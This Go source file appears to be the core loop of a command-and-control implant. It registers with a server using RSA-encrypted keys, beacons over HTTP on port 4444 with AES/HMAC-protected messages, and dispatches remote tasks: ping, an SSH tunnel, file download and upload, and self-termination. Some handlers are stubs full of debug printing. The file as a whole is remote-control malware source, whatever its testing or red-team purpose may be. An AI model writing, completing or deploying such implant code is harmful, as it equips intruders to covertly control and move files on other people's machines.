package core

import (
	"bytes"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"io"
	"os"
	"purpcmd/implant/ssh"
	"purpcmd/internal"
	"purpcmd/internal/encrypt"
	"time"
)

func Start() {
	i := ImplantInit()

	h := HTTPNew(i.SessionID)
	h.HTTPSetSocket("0.0.0.0:4444")
	h.HTTPSetURL(false, "/")

	enc := encrypt.EncryptInit()
	key, iv := enc.EncryptGetKeys()

	r := PackRegistration(i, key, iv)
	aux, err := enc.RSAEncode(r)
	if err != nil {
		println(err.Error())
		return
	}

	fmt.Println("key", base64.StdEncoding.EncodeToString(key[:]), "iv", base64.StdEncoding.EncodeToString(iv[:]))

	p := base64.StdEncoding.EncodeToString(aux)
	println(p)
	h.PostRegistering([]byte(p))

	for {
		data := PackCheck(i)
		dataEnc := enc.AESCbcEncrypt(data)

		enc.HMACPackAddHmac(&dataEnc)
		dataP := base64.StdEncoding.EncodeToString(dataEnc)

		println("sent check:",dataP)
		resp, err := h.Get([]byte(dataP))
		if err != nil {
			println(err.Error())
		}
		
		xyz,_ := io.ReadAll(resp)
		fmt.Println("Data received ", len(xyz))
		if len(xyz) < 16 {
			time.Sleep(time.Duration(i.Sleep) * time.Second)
			continue
		}
		dataB64 := make([]byte, base64.StdEncoding.DecodedLen(len(xyz)))
		n, _ := base64.StdEncoding.Decode(dataB64, xyz)

		if !enc.HMACVerifyHash(dataB64[:n]) {
			fmt.Println("data not verified properly")
			return
		}
		dataOrig := dataB64[:n][:len(dataB64[:n])-16]
		xyzDecry, err := enc.AESCbcDecrypt(dataOrig)
		if err != nil {
			println(err.Error())
			return
		}

		tid, tcode, payload := PackParseTask(bytes.NewReader(xyzDecry))

		print("->",tcode)
		switch tcode {
		case internal.PING:
			println("\n->",tcode)
			responseTaskPayload := string(payload) + " pong"
			taskResp := PackResponse(i, []byte(responseTaskPayload), tid)

			dataEnc := enc.AESCbcEncrypt(taskResp)
			enc.HMACPackAddHmac(&dataEnc)
			taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
			println(taskRestEnc)
			h.Post([]byte(taskRestEnc))
		case internal.SSH:
			print("->",tcode, "calling ssh for ", h.Socket)
			ssh.Wsclient("aaa","/any.png" , h.Socket)
		case internal.DOWN:
			println("\n->",tcode)
			taskResp := PackChunk(i, "any.txt", []byte("aaa"), tid)

			dataEnc := enc.AESCbcEncrypt(taskResp)
			enc.HMACPackAddHmac(&dataEnc)
			taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
			println(taskRestEnc)
			h.Post([]byte(taskRestEnc))
		case internal.UPL:
			//Step		Size	Offset (bytes)
			//nameLen	2		0
			//name		N		2
			//dataLen	4		2 + N
			//data		M		2 + N + 4
			println("\n->",tcode)
			nameLen := binary.BigEndian.Uint16(payload[:2])
			name := payload[2 : 2+nameLen]

			dataLenStart := 2 + nameLen
			dataLen := binary.BigEndian.Uint32(payload[dataLenStart : dataLenStart+4])

			dataStart := dataLenStart + 4
			data := payload[dataStart : uint32(dataStart)+uint32(dataLen)]

			println("got file name ", name," with data ", string(data))

			responseTaskPayload := "saved file to "+string(name)
			taskResp := PackResponse(i, []byte(responseTaskPayload), tid)

			dataEnc := enc.AESCbcEncrypt(taskResp)
			enc.HMACPackAddHmac(&dataEnc)
			taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
			println(taskRestEnc)
			h.Post([]byte(taskRestEnc))

		case internal.KILL:
			println("\n->",tcode)
			os.Exit(0)
		default:
			print("->",tcode, "Nothing")
		}

		time.Sleep(time.Duration(i.Sleep) * time.Second)
	}
}